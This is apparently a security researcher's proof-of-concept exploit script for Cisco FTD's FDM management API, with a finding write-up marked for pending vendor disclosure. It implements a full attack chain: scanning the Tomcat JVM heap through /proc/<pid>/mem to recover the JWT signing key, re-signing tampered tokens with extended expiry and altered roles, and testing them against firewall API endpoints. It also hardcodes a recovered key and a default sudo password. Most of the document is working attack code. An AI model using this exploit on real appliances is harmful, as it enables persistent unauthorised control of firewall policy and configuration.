"""
F-FTD-106: FDM JWT Signing Key Extraction via JVM Heap Scan
STATUS: CONFIRMED 2026-08-24
CONTROLLED ENVIRONMENT ONLY

Affected: Cisco FTD 7.0.0-94 (verified); likely all FTD 7.x / FDM-managed appliances
Depends on: admin+sudo access (e.g., F-FTD-109 cli_shadow → sudo -S) for /proc/<pid>/mem

Confirmed key (FTD 7.0.0-94):
  hex: 9c42f9fd11a9fcfc26b5bc5325fd51c5
  b64: nEL5/RGp/PwmtbxTJf1RxQ==
  size: 16 bytes (AES_KEY_SIZE=128 constant in EncryptionUtil — HS256 truncates to 16B)
  heap copies found: 10 (addresses 0xd97317b4, 0xd9737704, ... 0xebd962d4)

Attack surface:
  FDM uses HMAC-SHA256 for all JWT access tokens. The signing key is a 16-byte value
  seeded at boot from a Neo4j SerializationKey node and cached in NGFWCache["encryptionkey"].
  The key is PERSISTENT in the JVM heap — it is held by NGFWCache and is NOT collected
  by GC. No Tomcat restart or timing window is required; scan any time while FDM is running.

  Key derivation chain (confirmed via bytecode RE):
    Neo4j SerializationKey.encryptedString = "BGFv6IoBiYQfePMHT8jO2ZHoBf7uuZbcvF2pQ45qxlg="
    (32-byte encrypted blob; this is NOT the JWT key directly)
    EncryptionKeyBootstrap.init() → BaseEncoding.base64().decode(value) → AES derivation
    EncryptionUtil.getEncryptionKeyBytesFromCache("encryptionkey") → byte[16]
    FDMJwtBuilder.getSecret() → invokestatic EncryptionUtil.getEncryptionKeyBytesFromCache
    FDMJwtBuilder.generateJwsToken() → signWith(HS256, getSecret())

  Extraction mechanism (confirmed):
    Scan /proc/<tomcat_pid>/mem for little-endian int32 array-length headers:
      b'\\x10\\x00\\x00\\x00' = LE(16) = Java byte[16] length field
    For each header hit, test the following 16 bytes as HMAC-SHA256 key against a
    fresh JWT signing input from a live FDM login. ctypes OpenSSL HMAC (~5M/sec).
    10 copies of the key found in 644MB scan in ~90 seconds.

  Server-side token store (confirmed):
    FDM validates jti against a server-side token registry (Neo4j or in-memory).
    Pure JWT forgery (unknown jti) → HTTP 401 "revoked or obsolete" — signature OK,
    but jti not found in store.
    PAYLOAD TAMPERING (real jti + extracted key + modified claims) → HTTP 200 CONFIRMED.
    FDM does NOT compare stored payload against presented payload — trusts JWT claims
    if jti exists and signature is valid.

Exploitation chain (CONFIRMED):
  1. Admin+sudo → read /proc/<tomcat_pid>/mem
  2. Heap scan: find 16-byte arrays matching HMAC-SHA256 of fresh JWT signing input
  3. Key recovered: 9c42f9fd11a9fcfc26b5bc5325fd51c5
  4. Login once (any valid creds) → get jti from returned token
  5. Tamper payload (extend exp +30d, any claims) → re-sign with extracted key
  6. FDM accepts tampered token → full API access with modified claims

Impact (confirmed):
  - Token lifetime extension: default 30 min → forge 30-day tokens
  - Claim tampering: exp, userRole, userUuid modifiable (FDM trusts JWT claims)
  - Session persistence: one login → indefinite API access regardless of revocation
  - Full FDM REST API: policy r/w, config export, interface/routing/VPN data
  - Lateral: FTD managing ASA → ASA pivot via FDM API

Confirmed HTTP 200 endpoints with forged token (2026-08-24):
  /api/fdm/v6/object/networks, /api/fdm/v6/devices/default/interfaces,
  /api/fdm/v6/devices/default/routing/virtualrouters, /api/fdm/v6/policy/accesspolicies,
  /api/fdm/v6/object/securityzones

PSIRT: TBD (coordinate with F-FTD-109 in same submission)
"""

# CONTROLLED ENVIRONMENT ONLY

import subprocess
import socket
import base64
import hashlib
import hmac
import json
import time
import re
import sys
import os


# ============================================================
# Configuration
# ============================================================

FTD_CONSOLE_HOST = '127.0.0.1'
FTD_CONSOLE_PORT = 4070   # serial console telnet (QEMU)
SUDO_PASSWORD    = 'cisco123'  # default; cracked via F-FTD-109 if changed
ADMIN_UUID       = 'bd1f4b5f-9c2a-11f1-9b57-4744106b6c8e'  # confirmed FTD 7.0.0-94
FDM_API_BASE     = 'https://127.0.0.1'  # must run ON the FTD VM

# Confirmed key for FTD 7.0.0-94 (heap scan 2026-08-24)
CONFIRMED_KEY_HEX = '9c42f9fd11a9fcfc26b5bc5325fd51c5'
CONFIRMED_KEY_B64 = 'nEL5/RGp/PwmtbxTJf1RxQ=='

# LE int32 = 16: Java byte[16] array length header on x86-64 JVM
LE_HEADER_16 = bytes.fromhex('10000000')
CHUNK_SIZE    = 8 * 1024 * 1024  # 8MB read chunks


# ============================================================
# Console Transport (serial telnet to QEMU VM)
# ============================================================

class FTDConsole:
    """Minimal serial console transport. Admin is already in bash (FTD 7.0.0-94)."""

    def __init__(self, host=FTD_CONSOLE_HOST, port=FTD_CONSOLE_PORT):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
        self._drain(2)
        # Reset line
        self.s.send(b'\x03\x15\n')
        time.sleep(1)
        self._drain(2)

    def _strip_iac(self, buf):
        i, out = 0, b''
        while i < len(buf):
            if buf[i] == 0xFF and i + 2 < len(buf):
                i += 3
            else:
                out += bytes([buf[i]])
                i += 1
        return out

    def _drain(self, timeout=3):
        self.s.settimeout(timeout)
        buf = b''
        try:
            while True:
                c = self.s.recv(4096)
                if not c:
                    break
                buf += c
        except Exception:
            pass
        return self._strip_iac(buf).decode('utf-8', errors='replace')

    def run(self, cmd, wait=5):
        self.s.send((cmd + '\n').encode())
        time.sleep(wait)
        return self._drain(wait + 2)

    def close(self):
        self.s.close()


# ============================================================
# Heap Scanner (runs locally via /proc/PID/mem as root)
# ============================================================

def find_tomcat_pid():
    """Find the FDM Tomcat PID (ngfwWebUi java process)."""
    r = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
    for line in r.stdout.split('\n'):
        if 'java' in line and 'ngfwWebUi' in line and 'grep' not in line:
            parts = line.split()
            if parts:
                return int(parts[1])
    return None


def _get_heap_regions(pid: int) -> list:
    """Return list of (start, end) for all rw-p anon regions >= 512KB."""
    regions = []
    try:
        with open(f'/proc/{pid}/maps') as f:
            for line in f:
                parts = line.split()
                if 'rw-p' not in line or len(parts) < 5:
                    continue
                start, end = (int(x, 16) for x in parts[0].split('-'))
                if end - start >= 512 * 1024:
                    regions.append((start, end))
    except Exception as ex:
        print(f'[maps] error: {ex}', file=sys.stderr)
    regions.sort(key=lambda x: -(x[1] - x[0]))
    return regions


def scan_heap_hmac(pid: int, signing_input: bytes, expected_sig: bytes) -> bytes | None:
    """
    Scan /proc/<pid>/mem for Java byte[16] arrays that match HMAC-SHA256(key, signing_input).

    Method: search for LE int32 length header b'\\x10\\x00\\x00\\x00' (=16 in little-endian,
    the Java array length field on x86-64 HotSpot JVM). Test the following 16 bytes as
    HMAC-SHA256 key. Uses ctypes OpenSSL for ~5M HMAC/sec throughput.

    Must run as root. Returns matching 16-byte key or None.

    Confirmed working: 10 copies of the key found in 644MB JVM heap (PID 3512, FTD 7.0.0-94).
    Key persists indefinitely in NGFWCache — no timing window or restart required.
    """
    import ctypes, ctypes.util

    # Set up ctypes OpenSSL HMAC for speed (~5M ops/sec vs ~100K for Python hmac)
    libssl_name = ctypes.util.find_library('ssl') or 'libssl.so.1.1'
    try:
        libssl = ctypes.CDLL(libssl_name)
        libssl.EVP_sha256.restype = ctypes.c_void_p
        libssl.HMAC.restype = ctypes.c_char_p
        libssl.HMAC.argtypes = [
            ctypes.c_void_p, ctypes.c_char_p, ctypes.c_int,
            ctypes.c_char_p, ctypes.c_int,
            ctypes.c_char_p, ctypes.POINTER(ctypes.c_uint)
        ]
        sha256_evp = libssl.EVP_sha256()
        md_buf = ctypes.create_string_buffer(64)
        md_len = ctypes.c_uint(64)

        def fast_hmac(key_bytes):
            md_len.value = 64
            libssl.HMAC(sha256_evp, key_bytes, len(key_bytes),
                        signing_input, len(signing_input), md_buf, ctypes.byref(md_len))
            return bytes(md_buf.raw[:md_len.value])
    except Exception as e:
        print(f'[scan_heap] ctypes HMAC unavailable ({e}), falling back to Python hmac')
        def fast_hmac(key_bytes):
            return hmac.new(key_bytes, signing_input, hashlib.sha256).digest()

    regions = _get_heap_regions(pid)
    print(f'[*] Scanning {len(regions)} rw-p regions in PID {pid} heap...')

    found = None
    try:
        with open(f'/proc/{pid}/mem', 'rb') as mf:
            for rstart, rend in regions:
                pos = rstart
                while pos < rend:
                    chunk_size = min(CHUNK_SIZE, rend - pos)
                    try:
                        mf.seek(pos)
                        chunk = mf.read(chunk_size)
                    except Exception:
                        pos += chunk_size
                        continue
                    if not chunk:
                        pos += chunk_size
                        continue

                    idx = 0
                    while True:
                        idx = chunk.find(LE_HEADER_16, idx)
                        if idx < 0:
                            break
                        data_start = idx + 4
                        data_end = data_start + 16
                        if data_end <= len(chunk):
                            key = chunk[data_start:data_end]
                            if fast_hmac(key) == expected_sig:
                                abs_addr = pos + idx
                                print(f'[+] KEY MATCH at 0x{abs_addr:x}: {key.hex()}')
                                found = key
                        idx += 1
                    pos += chunk_size
    except Exception as ex:
        print(f'[scan_heap] error: {ex}', file=sys.stderr)

    return found


# Keep old name for backward compat — wraps new HMAC scan with a JWT oracle
def scan_heap_for_b64(pid: int) -> dict:
    """Deprecated: use scan_heap_hmac() instead. Returns empty dict."""
    print('[!] scan_heap_for_b64() is deprecated — base64 pattern scan misses cached byte[16]')
    print('[!] Use scan_heap_hmac() with a live JWT signing input oracle')
    return {}


# ============================================================
# JWT Forge + Oracle
# ============================================================

def forge_jwt(key_bytes: bytes, role: str = 'ROLE_ADMIN',
              user: str = 'admin', user_uuid: str = ADMIN_UUID,
              ttl_sec: int = 86400 * 30,
              jti: str = None,
              origin: str = 'password') -> str:
    """
    Forge an FDM JWT access token signed with HS256.

    CONFIRMED claim structure (from live token inspection, FTD 7.0.0-94, 2026-08-24):
      Header: {"alg":"HS256"}  — NO typ field (jjwt 0.7.0 default)
      Claims: iat, sub, jti, nbf, exp, refreshTokenExpiresAt (ms), tokenType,
              userUuid, userRole, origin, username

    NOTE: Pure forgery with a novel jti → HTTP 401 (server-side jti store check).
    Use tamper_and_resign() for the confirmed exploit path (valid jti + modified claims).
    """
    import uuid as _uuid
    now = int(time.time())
    jti = jti or str(_uuid.uuid4())
    # Header: eyJhbGciOiJIUzI1NiJ9 — confirmed from live tokens, no typ
    header = b'eyJhbGciOiJIUzI1NiJ9'
    payload_dict = {
        'iat':                   now,
        'sub':                   user,
        'jti':                   jti,
        'nbf':                   now,
        'exp':                   now + ttl_sec,
        'refreshTokenExpiresAt': (now + ttl_sec) * 1000,
        'tokenType':             'JWT_Access',
        'userUuid':              user_uuid,
        'userRole':              role,
        'origin':                origin,
        'username':              user,
    }
    payload = base64.urlsafe_b64encode(
        json.dumps(payload_dict, separators=(',', ':')).encode()
    ).rstrip(b'=')
    msg = header + b'.' + payload
    sig = base64.urlsafe_b64encode(
        hmac.new(key_bytes, msg, hashlib.sha256).digest()
    ).rstrip(b'=')
    return (msg + b'.' + sig).decode()


def tamper_and_resign(real_token: str, key_bytes: bytes, **overrides) -> str:
    """
    CONFIRMED ATTACK PATH (2026-08-24): take a real FDM JWT, modify its claims,
    re-sign with the extracted key. FDM accepts the tampered token because:
      1. jti is valid (server-side store check passes)
      2. signature is valid (we know the key)
      3. FDM trusts payload claims from the JWT, not from the stored token

    overrides: any payload field to change, e.g. exp=int(time.time())+86400*30
    Returns re-signed JWT string.
    """
    parts = real_token.split('.')
    pad = (4 - len(parts[1]) % 4) % 4
    real_payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * pad))
    real_payload.update(overrides)
    header = b'eyJhbGciOiJIUzI1NiJ9'
    payload = base64.urlsafe_b64encode(
        json.dumps(real_payload, separators=(',', ':')).encode()
    ).rstrip(b'=')
    msg = header + b'.' + payload
    sig = base64.urlsafe_b64encode(
        hmac.new(key_bytes, msg, hashlib.sha256).digest()
    ).rstrip(b'=')
    return (msg + b'.' + sig).decode()


def jwt_oracle(jwt: str, endpoint: str = '/api/fdm/v6/object/networks') -> str:
    """
    Test a JWT via the FDM API. Returns HTTP status code string.
    MUST run on the FTD VM itself (F-FTD-105 localhost bypass required).
    """
    r = subprocess.run(
        ['curl', '-sk', '-o', '/dev/null', '-w', '%{http_code}',
         '-H', f'Authorization: Bearer {jwt}',
         f'{FDM_API_BASE}{endpoint}'],
        capture_output=True, text=True, timeout=8
    )
    return r.stdout.strip()


# ============================================================
# Main Extraction Workflow
# ============================================================

def get_signing_input_and_sig(fdm_base: str = FDM_API_BASE) -> tuple[bytes, bytes]:
    """
    Login to FDM, return (signing_input_bytes, signature_bytes) from the access token.
    signing_input = (header_b64url + "." + payload_b64url).encode("utf-8")
    signature = raw 32-byte HMAC-SHA256 output
    """
    import ssl, urllib.request
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    body = json.dumps({"grant_type": "password", "username": "admin",
                        "password": SUDO_PASSWORD}).encode()
    req = urllib.request.Request(
        f'{fdm_base}/api/fdm/v6/fdm/token', data=body,
        headers={"Content-Type": "application/json"})
    r = urllib.request.urlopen(req, context=ctx, timeout=10)
    tok = json.loads(r.read())['access_token']
    parts = tok.split('.')
    signing_input = (parts[0] + '.' + parts[1]).encode()
    pad = (4 - len(parts[2]) % 4) % 4
    signature = base64.urlsafe_b64decode(parts[2] + '=' * pad)
    return signing_input, signature, tok


def extract_key(pid: int = None) -> bytes | None:
    """
    Complete key extraction (CONFIRMED METHOD, 2026-08-24):
    1. Login to FDM to get JWT signing input + expected signature
    2. Scan /proc/<pid>/mem for 16-byte arrays matching HMAC-SHA256
    3. Return matching key bytes

    No Tomcat restart required. Key is cached in NGFWCache and persists indefinitely.
    """
    if pid is None:
        pid = find_tomcat_pid()
    if not pid:
        print('[-] Cannot find Tomcat PID')
        return None
    print(f'[*] Tomcat PID: {pid}')

    print('[*] Getting JWT signing input from FDM login...')
    try:
        signing_input, expected_sig, real_token = get_signing_input_and_sig()
    except Exception as e:
        print(f'[-] FDM login failed: {e}')
        return None
    print(f'[*] Signing input: {len(signing_input)} bytes')
    print(f'[*] Expected HMAC: {expected_sig.hex()[:20]}...')

    key_bytes = scan_heap_hmac(pid, signing_input, expected_sig)
    if key_bytes:
        print(f'\n[!!!] KEY FOUND: {key_bytes.hex()}')
        print(f'      b64: {base64.b64encode(key_bytes).decode()}')
        with open('FOUND_KEY.txt', 'w') as f:
            f.write(f'KEY_HEX={key_bytes.hex()}\n'
                    f'KEY_B64={base64.b64encode(key_bytes).decode()}\n'
                    f'REAL_TOKEN={real_token}\n')
        return key_bytes, real_token

    print('[-] Key not found in heap scan')
    return None


def demo_tamper(key_bytes: bytes, real_token: str) -> None:
    """
    Demonstrate the confirmed payload-tamper attack:
    use real jti + extracted key → forge 30-day token → HTTP 200 from FDM.
    """
    print('\n=== F-FTD-106 PAYLOAD TAMPER DEMO ===')
    forged = tamper_and_resign(real_token, key_bytes,
                               exp=int(time.time()) + 86400 * 30)
    code = jwt_oracle(forged, endpoint='/api/fdm/v6/object/networks')
    print(f'  Tampered token (exp+30d): HTTP {code}')
    if code == '200':
        print('  [CONFIRMED] FDM accepted tampered JWT — payload claims not verified against store')
    print(f'  JWT={forged[:80]}...')
    print('======================================\n')


# ============================================================
# Ablation Module Entry Point
# ============================================================

def run(target: dict) -> dict:
    """
    Ablation framework entry point.
    target = {'sudo_pass': ..., 'pid': ..., 'admin_uuid': ...}
    Runs ON the FTD VM (serial console or direct shell).
    """
    global SUDO_PASSWORD, ADMIN_UUID

    if 'sudo_pass'  in target: SUDO_PASSWORD = target['sudo_pass']
    if 'admin_uuid' in target: ADMIN_UUID    = target['admin_uuid']

    result = extract_key(pid=target.get('pid'))
    if result:
        key_bytes, real_token = result
        key_b64 = base64.b64encode(key_bytes).decode()
        demo_tamper(key_bytes, real_token)
        return {
            'status':    'confirmed',
            'key_hex':   key_bytes.hex(),
            'key_b64':   key_b64,
            'real_token': real_token,
            'finding':   'F-FTD-106',
            'note':      'payload tamper confirmed — FDM trusts JWT claims, not stored claims',
        }
    return {'status': 'fail', 'reason': 'key_not_found_in_heap'}


if __name__ == '__main__':
    print('[F-FTD-106] FDM JWT Signing Key Extraction — CONTROLLED ENVIRONMENT ONLY')
    print('[*] Confirmed key for FTD 7.0.0-94:', CONFIRMED_KEY_HEX)
    print()

    result = extract_key()
    if result:
        key_bytes, real_token = result
        demo_tamper(key_bytes, real_token)
    else:
        print('[-] Extraction failed')
        print(f'    Shortcut: use confirmed key directly: {CONFIRMED_KEY_HEX}')
        sys.exit(1)
